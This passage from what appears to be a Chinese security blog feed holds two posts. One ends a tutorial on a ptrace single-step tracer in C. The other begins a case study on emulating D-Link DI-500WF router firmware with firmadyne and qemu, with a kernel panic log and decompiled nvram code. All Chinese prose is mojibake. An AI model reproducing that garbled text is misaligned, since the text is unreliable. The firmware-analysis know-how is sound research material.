<span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Debugger Test\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="type">pid_t</span> pid = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(argc != <span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Please set a filename!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	pid = fork();</span><br><span class="line">	<span class="keyword">if</span>(pid &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;fork failed!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;  <span class="comment">// child process</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Child process running!\n&quot;</span>);</span><br><span class="line">		startProcess(argv[<span class="number">1</span>]);  <span class="comment">// å­è¿›ç¨‹å¯åŠ¨å¦ä¸€ä¸ªç¨‹åº</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(pid &gt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Current chind PID: %d\n&quot;</span>, pid);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Current parent PID: %d\n&quot;</span>, getpid());</span><br><span class="line">		MyDebugger(pid);   <span class="comment">// çˆ¶è¿›ç¨‹å‡†å¤‡è¿½è¸ª</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ‰§è¡Œç»“æœï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Debugger Test</span><br><span class="line">Current chind PID: 7726</span><br><span class="line">Current parent PID: 7725</span><br><span class="line">Child process running!</span><br><span class="line">Process starting!</span><br><span class="line">Hello World!</span><br><span class="line">Target run 11919 instructions!</span><br></pre></td></tr></table></figure></div>

<p>å¦å¤–è¿˜å¯ä»¥ç®€å•ä¿®æ”¹ä¸€ä¸‹ä»£ç </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">startProcess</span><span class="params">(<span class="type">char</span>* fileName)</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Process starting!\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ptrace Error!1\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	execl(fileName, fileName, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">MyDebugger</span><span class="params">(<span class="type">pid_t</span> childPid)</span>&#123;</span><br><span class="line">	<span class="type">int</span> wait_status;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> icounter = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	wait(&amp;wait_status);</span><br><span class="line">	<span class="keyword">while</span>(WIFSTOPPED(wait_status))&#123;</span><br><span class="line">		icounter++;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">		ptrace(PTRACE_GETREGS, childPid, <span class="number">0</span>, &amp;regs);</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ins = ptrace(PTRACE_PEEKTEXT, childPid, regs.rip, <span class="number">0</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Trace: RIP = 0x%08x, TEXT = 0x%08x\n&quot;</span>, regs.rip, ins);</span><br><span class="line">		<span class="keyword">if</span>(ptrace(PTRACE_SINGLESTEP, childPid, <span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ptrace Error!2\n&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		wait(&amp;wait_status);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Target run %d instructions!\n&quot;</span>, icounter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Debugger Test\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="type">pid_t</span> pid = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(argc != <span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Please set a filename!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	pid = fork();</span><br><span class="line">	<span class="keyword">if</span>(pid &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;fork failed!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;  <span class="comment">// child process</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Child process running!\n&quot;</span>);</span><br><span class="line">		startProcess(argv[<span class="number">1</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(pid &gt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Current chind PID: %d\n&quot;</span>, pid);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Current parent PID: %d\n&quot;</span>, getpid());</span><br><span class="line">		MyDebugger(pid);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>é€šè¿‡ ptrace çš„å…¶ä»–å·¥å…·ï¼Œæˆ‘ä»¬å¯ä»¥å®ç°è¯»å–ç›®æ ‡è¿›ç¨‹å¯„å­˜å™¨ã€ä»£ç æ®µæ•°æ®çš„ç›®çš„(éœ€è¦æ³¨æ„è¢«è¿½è¸ªçš„ç¨‹åºæ¶æ„)ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Trace: RIP = 0x0040e95c, TEXT = 0x20fd8148</span><br><span class="line">Trace: RIP = 0x0040e963, TEXT = 0xdf89f072</span><br><span class="line">Trace: RIP = 0x0040e965, TEXT = 0x34e8df89</span><br><span class="line">Trace: RIP = 0x0040e967, TEXT = 0x030034e8</span><br><span class="line">Trace: RIP = 0x0043e9a0, TEXT = 0x49d76348</span><br><span class="line">Trace: RIP = 0x0043e9a3, TEXT = 0xd0c1c749</span><br><span class="line">Trace: RIP = 0x0043e9aa, TEXT = 0x00e7b841</span><br><span class="line">Trace: RIP = 0x0043e9b0, TEXT = 0x00003cbe</span><br><span class="line">Trace: RIP = 0x0043e9b5, TEXT = 0x0f6619eb</span><br><span class="line">Trace: RIP = 0x0043e9d0, TEXT = 0x44d78948</span><br><span class="line">Trace: RIP = 0x0043e9d3, TEXT = 0x0fc08944</span><br><span class="line">Trace: RIP = 0x0043e9d6, TEXT = 0x3d48050f</span><br><span class="line">Target run 11919 instructions!</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>å›ºä»¶æ¨¡æ‹Ÿ Case Study (2)</title>
    <url>/2020/01/10/firmadyne2/</url>
    <content><![CDATA[<p>æœ€è¿‘åˆ†æ Dlink çš„ä¸€æ¬¾è®¾å¤‡ DI-500WFï¼Œå®˜ç½‘äº§å“åœ°å€ï¼š<a class="link"   href="http://www.dlink.com.cn/business/product?id=2918" >http://www.dlink.com.cn/business/product?id=2918<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>è¿™ç§è®¾å¤‡åœ¨é…’åº—ã€æœºåœºç­‰å…¬å…±åœºæ‰€æ¯”è¾ƒå¸¸è§ï¼Œä¸€èˆ¬ç§°ä¹‹ä¸ºè·¯ç”±æ¡ã€‚å› ä¸ºç±»ä¼¼é…’åº—ã€è½¦ç«™è¿™ç§å…¬å…±åœ°ç‚¹æ‘†æ”¾æ™®é€šè·¯ç”±å™¨æä¾› WiFI æœåŠ¡å­˜åœ¨ä¸€å®šé—®é¢˜ï¼ˆä½“ç§¯å¤ªå¤§ï¼Œèµ°çº¿å›°éš¾ç­‰ï¼‰ï¼Œæ‰€ä»¥åœ¨æˆ¿å±‹è£…ä¿®çš„æ—¶å€™ä¼šè€ƒè™‘å®‰è£…å¤šä¸ªå¼±ç”µç®±æˆ–åœ¨ä¸æ˜¾çœ¼çš„ä½ç½®å®‰è£…ç½‘ç»œæ¥å£ï¼Œæ­¤æ—¶è·¯ç”±æ¡å°±æ´¾ä¸Šç”¨åœºäº†ï¼Œè¿™ç§è®¾å¤‡ä¸éœ€è¦å¤–æ¥ç”µæºï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ RJ-45 æ¥å£ä¾›ç”µï¼Œå¹¶ä¸”ä½“ç§¯å°ï¼Œæ˜“äºå®‰è£…ã€‚è™½ç„¶è·¯ç”±æ¡ä½“ç§¯å°ï¼Œä½†æ˜¯å…¶å†…éƒ¨ç³»ç»Ÿå’Œæ™®é€šè·¯ç”±å™¨ç±»ä¼¼ï¼Œä»Šå¤©æˆ‘ä»¬æ¥ç®€å•çœ‹ä¸€ä¸‹å¦‚ä½•æ¨¡æ‹Ÿ DI-500WF è¿™æ¬¾è®¾å¤‡çš„ç³»ç»Ÿã€‚</p>
<p><em>æ³¨ï¼šæˆ‘ä¼šä¸€æ­¥æ­¥å±•ç¤ºåœ¨æ¨¡æ‹Ÿè¿‡ç¨‹ä¸­é‡åˆ°çš„é—®é¢˜ï¼Œå¹¶æå‡ºè§£å†³é—®é¢˜çš„å‡ ä¸ªæ–¹æ³•ï¼Œå¸Œæœ›èƒ½ç»™å¤§å®¶æ‹“å±•ä¸€ä¸‹æ€è·¯ã€‚</em></p>
<span id="more"></span>

<h2 id="ä¸‹è½½å›ºä»¶"><a href="#ä¸‹è½½å›ºä»¶" class="headerlink" title="ä¸‹è½½å›ºä»¶"></a>ä¸‹è½½å›ºä»¶</h2><p>å›ºä»¶ä¸‹è½½åœ°å€ï¼š<a class="link"   href="http://support.dlink.com.cn/techsupport/DI-500WF-WT" >http://support.dlink.com.cn/techsupport/DI-500WF-WT<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> (ç›®å‰æœ€æ–°ç‰ˆæœ¬ä¸º 2019-01-08)</p>
<p>ä¸‹è½½å›ºä»¶çš„åŒæ—¶æˆ‘ä»¬ä¹Ÿå°†ä½¿ç”¨æ‰‹å†Œä¸‹è½½ä¸‹æ¥ã€‚</p>
<h2 id="firmadyne-æ¨¡æ‹Ÿ"><a href="#firmadyne-æ¨¡æ‹Ÿ" class="headerlink" title="firmadyne æ¨¡æ‹Ÿ"></a>firmadyne æ¨¡æ‹Ÿ</h2><p>å¸¸è§„æ“ä½œï¼ŒæŒ‰ç…§ github å®˜ç½‘ç»™å‡ºçš„æç¤ºä¸€æ­¥æ­¥è¾“å…¥å‘½ä»¤ï¼Œåˆ° inferNetwork è¿™ä¸€æ­¥ä¼šé‡åˆ°é—®é¢˜ï¼Œæ•´ä¸ªè„šæœ¬è¿è¡Œè¿‡ç¨‹ä¸­å¹¶æ²¡æœ‰æŠ¥é”™ï¼Œä½†è„šæœ¬æ‰§è¡Œå®Œæ¯•å¹¶æ²¡æœ‰è¾“å‡ºç½‘å¡ä¿¡æ¯ã€‚</p>
<p>è¿™é‡Œæˆ‘æ²¡æœ‰å»æ·±ç©¶åŸå› ï¼Œè€Œæ˜¯ç›´æ¥æ‰§è¡Œ run.sh å°è¯•å¯åŠ¨é•œåƒï¼Œå†…æ ¸ä¿¡æ¯è¾“å‡ºæ­£å¸¸ï¼Œæœ€åä¼šæ‰“å°ä¸€è¡Œ</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hit ENTER for console...</span><br></pre></td></tr></table></figure></div>

<p>ä½†æ¥ç€ä¼šè¾“å‡ºä¸€å¤§å † &#x2F;proc&#x2F;nvram: æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶æˆ–ç›®å½•ã€‚</p>
<p>å¤§æ¦‚ 1 åˆ†é’Ÿå·¦å³è¾“å‡ºå¦‚ä¸‹ä¿¡æ¯ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[   13.192000] do_page_fault() #2: sending SIGSEGV to init for invalid read access from</span><br><span class="line">[   13.192000] 00000000 (epc == 2aeeba24, ra == 2ab20490)</span><br><span class="line">[   13.192000] Cpu 0</span><br><span class="line">[   13.192000] $ 0   : 00000000 fffffffe 7f977018 7f977018</span><br><span class="line">[   13.192000] $ 4   : 7f977018 00000000 0000000b 00000000</span><br><span class="line">[   13.192000] $ 8   : 00000000 7f976f5b 00000008 8f820000</span><br><span class="line">[   13.196000] $12   : 8f821eb0 000007a0 00000000 00000008</span><br><span class="line">[   13.196000] $16   : 2aba0000 7f977481 7f977030 2ab701b4</span><br><span class="line">[   13.196000] $20   : 7f977018 7f97747a 2ab72920 2ab72920</span><br><span class="line">[   13.196000] $24   : 00000018 2aeeba10                  </span><br><span class="line">[   13.196000] $28   : 2ac08180 7f976ff0 0041a448 2ab20490</span><br><span class="line">[   13.196000] Hi    : 000001a5</span><br><span class="line">[   13.196000] Lo    : 00001396</span><br><span class="line">[   13.196000] epc   : 2aeeba24 0x2aeeba24</span><br><span class="line">[   13.196000]     Not tainted</span><br><span class="line">[   13.196000] ra    : 2ab20490 0x2ab20490</span><br><span class="line">[   13.196000] Status: 0000a413    USER EXL IE </span><br><span class="line">[   13.196000] Cause : 10800008</span><br><span class="line">[   13.196000] BadVA : 00000000</span><br><span class="line">[   13.196000] PrId  : 00019300 (MIPS 24Kc)</span><br><span class="line">[   13.196000] Modules linked in:</span><br><span class="line">[   13.196000] Process init (pid: 1, threadinfo=8f820000, task=8f81fb68, tls=2aab7880)</span><br><span class="line">[   13.196000] Stack : 00000000 00000000 7f977468 7f97746a</span><br><span class="line">[   13.196000] Call Trace:</span><br><span class="line">[   13.196000] </span><br><span class="line">[   13.196000] </span><br><span class="line">[   13.196000] Code: 00801821  24a50001  24630001 &lt;90a40000&gt; 1480fffc  a0640000  03e00008  00000000  00000000 </span><br><span class="line">[   13.200000] init/1: potentially unexpected fatal signal 11.</span><br><span class="line">[   13.200000] </span><br><span class="line">[   13.200000] Cpu 0</span><br><span class="line">[   13.200000] $ 0   : 00000000 fffffffe 7f977018 7f977018</span><br><span class="line">[   13.200000] $ 4   : 7f977018 00000000 0000000b 00000000</span><br><span class="line">[   13.200000] $ 8   : 00000000 7f976f5b 00000008 8f820000</span><br><span class="line">[   13.200000] $12   : 8f821eb0 000007a0 00000000 00000008</span><br><span class="line">[   13.200000] $16   : 2aba0000 7f977481 7f977030 2ab701b4</span><br><span class="line">[   13.200000] $20   : 7f977018 7f97747a 2ab72920 2ab72920</span><br><span class="line">[   13.200000] $24   : 00000018 2aeeba10                  </span><br><span class="line">[   13.200000] $28   : 2ac08180 7f976ff0 0041a448 2ab20490</span><br><span class="line">[   13.200000] Hi    : 000001a5</span><br><span class="line">[   13.200000] Lo    : 00001396</span><br><span class="line">[   13.200000] epc   : 2aeeba24 0x2aeeba24</span><br><span class="line">[   13.200000]     Not tainted</span><br><span class="line">[   13.200000] ra    : 2ab20490 0x2ab20490</span><br><span class="line">[   13.200000] Status: 0000a413    USER EXL IE </span><br><span class="line">[   13.204000] Cause : 10800008</span><br><span class="line">[   13.204000] BadVA : 00000000</span><br><span class="line">[   13.204000] PrId  : 00019300 (MIPS 24Kc)</span><br><span class="line">[   13.208000] Kernel panic - not syncing: Attempted to kill init!</span><br></pre></td></tr></table></figure></div>

<p>æ˜¾ç¤ºå‡ºç°é”™è¯¯ï¼Œå†…æ ¸å°è¯• kill æ‰ init è¿›ç¨‹ã€‚ç†Ÿæ‚‰ linux çš„åŒå­¦åº”è¯¥çŸ¥é“ init æ˜¯å†…æ ¸å¯åŠ¨çš„ç¬¬ä¸€ä¸ªç”¨æˆ·çº§åˆ«è¿›ç¨‹ï¼Œæ˜¯æœ€åŸºæœ¬çš„ç¨‹åºä¹‹ä¸€ã€‚è¿ init è¿›ç¨‹éƒ½å´©æºƒæ‰äº†ï¼Œè¿›å…¥ç³»ç»Ÿè‚¯å®šæ— æœ›ã€‚</p>
<p>å¢åŠ  strace é€‰é¡¹ä¹‹åç®€å•æ¢³ç†ä¸€ä¸‹ï¼Œå´©æºƒçš„è¿›ç¨‹æ˜¯ &#x2F;sbin&#x2F;rcï¼Œæ ¹ç›®å½•ä¸­çš„ init æ˜¯å®ƒçš„ç¬¦å·é“¾æ¥ã€‚</p>
<p>init è¿›ç¨‹å°è¯•åˆå§‹åŒ– nvram è®¾ç½®çš„æ—¶å€™ä¼šè°ƒç”¨ libnvram.so æä¾›çš„æ¥å£ï¼Œåœ¨æ­¤æ–‡ä»¶çš„ nvram_init å‡½æ•°ä¸­è¯•å›¾è®¿é—® &#x2F;proc&#x2F;nvram æ–‡ä»¶ï¼ŒçŒœæµ‹åœ¨åŸå§‹å†…æ ¸åˆå§‹åŒ–è¿‡ç¨‹ä¸­ä¼šè‡ªåŠ¨å»ºç«‹ &#x2F;proc&#x2F;nvramã€‚</p>
<p>å†…æ ¸è¢«æˆ‘ä»¬æ›¿æ¢äº†ï¼Œè‡ªç„¶ä¸ä¼šè‡ªåŠ¨åˆ›å»º nvram æ–‡ä»¶ã€‚è¿™é‡Œæœ€ç®€å•çš„æƒ³æ³•å°±æ˜¯æ‰‹åŠ¨åˆ›å»ºä¸€ä¸ªç©ºçš„ nvram æ–‡ä»¶ï¼Œå…ˆè§£å†³æ–‡ä»¶æ‰¾ä¸åˆ°çš„é—®é¢˜ï¼Œè‡³äºå…¶å†…å®¹æ˜¯å¦åˆæ³•æˆ‘ä»¬ä¹‹åå†è°ˆã€‚</p>
<p>ä¸è¿‡åˆä¸€ä¸ªæ¯”è¾ƒæ£˜æ‰‹çš„é—®é¢˜å‡ºç°äº†ï¼Œ&#x2F;proc ç›®å½•ä¸‹å­˜å‚¨çš„å¹¶ä¸æ˜¯æ™®é€šçš„æ–‡ä»¶ï¼Œè€Œæ˜¯è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼Œè¿™äº›æ–‡ä»¶å’Œå†…æ ¸æ¨¡å—æœ‰å…³ã€‚firmadyne æä¾›çš„å†…æ ¸æ˜¯å·²ç»ç¼–è¯‘å¥½çš„ï¼Œæˆ‘ä»¬å¾ˆéš¾å»æ‰‹åŠ¨å¢åˆ æ¨¡å—ï¼Œè€Œä¸”ç¼–å†™å†…æ ¸æ¨¡å—åˆæ˜¯ä¸€ä¸ªå¾ˆç¹ççš„äº‹æƒ…ã€‚æœ‰æ²¡æœ‰ä¸€ä¸ªæ›´ç®€å•çš„æ–¹æ³•å‘¢ï¼Ÿ</p>
<p>è¿™é‡Œæˆ‘æƒ³åˆ°ä¸¤ä¸ªè§£å†³æ–¹æ¡ˆï¼Œä¸€æ˜¯ä¸‹è½½æ ‡å‡†çš„ MIPS é•œåƒ(ä¾‹å¦‚ debian)ï¼Œä½¿ç”¨ qemu çš„ system æ¨¡å¼å¯åŠ¨ï¼Œç„¶åå°†å›ºä»¶çš„æ–‡ä»¶ç³»ç»Ÿä¸­çš„å„ä¸ªæ–‡ä»¶åˆ†åˆ«æ”¾åœ¨ qemu ç³»ç»Ÿçš„å¯¹åº”ä½ç½®(ä¾‹å¦‚ image&#x2F;lib &gt; &#x2F;lib)ï¼Œå†æ‰‹åŠ¨ç¼–å†™å†…æ ¸æ¨¡å—ï¼Œåˆ›å»º &#x2F;proc&#x2F;nvram ï¼Œä¹‹åå°è¯•ä»¿çœŸã€‚è¿™ç§æ–¹æ³•æ¯”è¾ƒé è°±ï¼Œä½†æ˜¯æ“ä½œåŠå…¶éº»çƒ¦ã€‚</p>
<p>äºŒæ˜¯åœ¨æ­£å¸¸çš„è™šæ‹Ÿæœºä¸Šè§£å‹é•œåƒï¼Œåœ¨é•œåƒçš„ &#x2F;proc ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ™®é€šæ–‡ä»¶ nvramï¼Œå†ç”¨ chroot + qemu çš„æ–¹å¼å¯åŠ¨ã€‚</p>
<p>ç»¼åˆæ¥çœ‹ç¬¬äºŒç§æ–¹å¼æ¯”è¾ƒç®€å•ï¼Œäºæ˜¯åŠ¨æ‰‹è¯•äº†ä¸‹(æ“ä½œå‰ä¸€å®šè¦å…ˆæ‹æ‘„å¿«ç…§ï¼ï¼ï¼)</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch ./proc/nvram</span><br><span class="line">locate qemu-mips-static    æ‰¾åˆ°é™æ€ç¼–è¯‘çš„ qemu äºŒè¿›åˆ¶ç¨‹åºä½ç½®</span><br><span class="line">cp &lt;qemu-mips-static&gt; ./qemu</span><br><span class="line">sudo chroot . ./qemu ./init    å¯åŠ¨ init è¿›ç¨‹</span><br></pre></td></tr></table></figure></div>

<p>init æ‰§è¡Œä¸€æ®µæ—¶é—´æŠ¥é”™æ®µé”™è¯¯ï¼ŒåŸå…ˆçš„æ‰¾ä¸åˆ° nvram é”™è¯¯å·²ç»æ¶ˆå¤±ã€‚ä½†è¿™æ—¶å€™æ— è®ºæ‰“å¼€ä»€ä¹ˆè½¯ä»¶éƒ½æ²¡æœ‰å“åº”ï¼Œæ‰“å¼€ç»ˆç«¯æç¤ºæ²¡æœ‰é‚£ä¸ªè¿›ç¨‹ QAQã€‚</p>
<p>ä¸è¿‡è¿˜æ˜¯æœ‰äº†æ„å¤–æ”¶è·ï¼ŒæŸ¥çœ‹ &#x2F;proc&#x2F;nvram æ–‡ä»¶å‘ç°é‡Œé¢å·²ç»å¡«å†™äº†å¾ˆå¤šå†…å®¹ï¼Œä¸€éƒ¨åˆ†æ˜¯æ ‡å‡†çš„é”®å€¼å¯¹æ ¼å¼ï¼Œå¦å¤–ä¸€éƒ¨åˆ†ç±»ä¼¼äºä¹±ç ï¼Œæ€»å½’æœ‰äº†è¿›å±•ã€‚</p>
<h2 id="å›ºä»¶åˆ†æ"><a href="#å›ºä»¶åˆ†æ" class="headerlink" title="å›ºä»¶åˆ†æ"></a>å›ºä»¶åˆ†æ</h2><p>firmadyne æ¨¡æ‹Ÿå¤±è´¥ï¼Œqemu æ¨¡æ‹Ÿä¹Ÿå¤±è´¥ï¼Œç°åœ¨ä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆå¤´ç»ªäº†ã€‚</p>
<p>è¿™æ—¶å€™æˆ‘å†³å®šå…ˆåˆ†æä¸€ä¸‹å›ºä»¶ï¼Œå…ˆä» init è¿›ç¨‹å¼€å§‹ï¼Œinit æ˜¯ &#x2F;sbin&#x2F;rc çš„ç¬¦å·é“¾æ¥ï¼Œæ‰€ä»¥æŠŠ rc æ‹·è´å‡ºæ¥ï¼Œä¸¢è¿› ghidra ç®€å•çœ‹ä¸€ä¸‹ã€‚</p>
<p>ä¸€ç•ªæŸ¥æ‰¾æ‰¾åˆ°äº†å’Œ nvram æœ‰å…³çš„éƒ¨åˆ†ä»£ç ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è®¿é—® &#x2F;proc&#x2F;nvram çš„è¿¹è±¡ï¼ŒæŸ¥çœ‹å¯¼å…¥å‡½æ•°å‘ç°ç»å¤§éƒ¨åˆ†å’Œ nvram æœ‰å…³çš„å‡½æ•°æ¥è‡ª libnvram.so ï¼Œäºæ˜¯è½¬è€Œåˆ†æ libnvram.soã€‚æ‰¾åˆ°å¦‚ä¸‹å‡½æ•°</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">nvram_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> *piVar1;</span><br><span class="line">  </span><br><span class="line">  _fdata = open(<span class="string">&quot;/proc/nvram&quot;</span>,<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">-1</span> &lt; _fdata) &#123;</span><br><span class="line">    DAT_0002fb00 = mmap((<span class="type">void</span> *)<span class="number">0x0</span>,<span class="number">0x100000</span>,<span class="number">1</span>,<span class="number">1</span>,_fdata,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (DAT_0002fb00 != (<span class="type">void</span> *)<span class="number">0xffffffff</span>) &#123;</span><br><span class="line">      fcntl(_fdata,<span class="number">2</span>,<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;mmap errr&quot;</span>);</span><br><span class="line">    close(_fdata);</span><br><span class="line">    _fdata = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  perror(<span class="string">&quot;/proc/nvram&quot;</span>);</span><br><span class="line">  piVar1 = __errno_location();</span><br><span class="line">  <span class="keyword">return</span> *piVar1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>åŸæ¥æ˜¯åˆå§‹åŒ–è¿‡ç¨‹ä¸­è°ƒç”¨äº† &#x2F;proc&#x2F;nvram å°è¯•è¯»å–ç›¸å…³é…ç½®ï¼Œè¿™æ—¶çªç„¶æƒ³åˆ° firmadyne æä¾›äº†ä¿®æ”¹ç‰ˆçš„ libnvram.so ï¼Œèƒ½å¦ç›´æ¥æ›¿æ¢è¿‡æ¥è§£å†³é—®é¢˜å‘¢ï¼Ÿ</p>
<p>å†æ¬¡ç”¨ firmadyne æ¨¡æ‹Ÿï¼Œä¸è¿‡è§£å‹å›ºä»¶ä¹‹åæ‰‹åŠ¨æ›¿æ¢ libnvram.so ã€‚é…ç½®ç½‘ç»œé˜¶æ®µä¾æ—§æ²¡æœ‰ IPã€‚</p>
<p>æŸ¥çœ‹æ—¥å¿—å‘ç°å’Œ nvram æœ‰å…³çš„é”™è¯¯æ¶ˆå¤±ï¼Œä¸è¿‡å¤šå‡ºæ¥é”™è¯¯ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/sbin/init: can&#x27;t resolve symbol &#x27;load_parameter</span><br></pre></td></tr></table></figure></div>

<p>ç”±äºæˆ‘ä»¬æ›¿æ¢äº† libcï¼Œå¯¼è‡´å¾ˆå¤šè®¾å¤‡è‡ªå·±ç‰¹æœ‰çš„å‡½æ•°ä¸¢å¤±ï¼Œè¿è¡Œä¾æ—§å‘ç”Ÿé”™è¯¯ã€‚</p>
<p>è¿™é‡Œæˆ‘æƒ³åˆ°2ä¸ªè§£å†³æ–¹æ¡ˆï¼šä¿®æ”¹ firmadyne  æä¾›çš„ libnvram.so çš„ä»£ç ï¼Œç¼ºå“ªäº› API å°±å¢åŠ ä¸Šå»ã€‚ä¸è¿‡æ­¤æ–¹æ³•å·¥ä½œé‡å¾ˆå¤§ï¼Œè€Œä¸”éœ€è¦ä¸€ç‚¹ç‚¹åˆ†ææ•´ä¸ªç¨‹åºçš„é€»è¾‘ã€‚</p>
